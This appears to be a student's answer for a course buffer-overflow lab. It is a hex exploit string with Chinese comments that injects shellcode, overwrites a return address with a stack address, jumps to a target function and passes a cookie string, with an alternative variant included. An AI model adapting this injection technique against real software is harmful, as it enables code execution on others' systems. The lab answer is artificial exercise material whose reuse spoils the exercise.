bf b8 dc 61 55              /* 地址用小端法存储 */
58                          /* pop %rbx 保持原本对齐 */
c3                          /* ret */
00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61     /* 利用栈帧机制,大地址总不会被覆盖 */

/* or
bf b8 dc 61 55
ff 24 24                    /* jmp *(%rsp) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61
*/

